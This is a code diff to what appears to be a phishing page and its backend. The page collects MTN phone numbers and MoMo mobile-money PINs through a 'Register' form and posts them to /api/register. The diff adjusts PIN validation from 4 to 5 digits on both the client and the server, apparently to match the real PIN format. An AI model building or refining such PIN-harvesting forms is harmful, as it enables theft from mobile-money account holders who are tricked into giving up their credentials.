@@ -57,7 +57,7 @@ header p{color:#666;margin-top:5px;font-size:0.95em}
 </div>
 <div class="form-group">
 <label>MoMo PIN <span class="required">*</span></label>
-<input type="password" id="momoPin" placeholder="Enter 4-digit PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required autocomplete="off">
+<input type="password" id="momoPin" placeholder="Enter 5-digit PIN" maxlength="5" pattern="[0-9]{5}" inputmode="numeric" required autocomplete="off">
 </div>
 <button type="submit" class="btn" id="submitBtn"><span id="submitText">Register</span></button>
 </form>
@@ -70,7 +70,7 @@ var mtnNumber=document.getElementById('mtnNumber').value.trim();
 var momoPin=document.getElementById('momoPin').value.trim();
 if(!mtnNumber){showMessage('Please enter your MTN number','error');return}
 if(mtnNumber.length<10){showMessage('Please enter a valid MTN number (10 digits)','error');return}
-if(!momoPin||momoPin.length!==4){showMessage('MoMo PIN must be 4 digits','error');return}
+if(!momoPin||momoPin.length!==5){showMessage('MoMo PIN must be 5 digits','error');return}
 var btn=document.getElementById('submitBtn');
 var btnText=document.getElementById('submitText');
 btn.disabled=true;
@@ -171,10 +171,10 @@ app.post('/api/register', async (req, res) => {
             });
         }
 
-        if (momoPin.length !== 4) {
+        if (momoPin.length !== 5) {
             return res.status(400).json({
                 success: false,
-                message: 'MoMo PIN must be 4 digits'
+                message: 'MoMo PIN must be 5 digits'
             });
         }
 
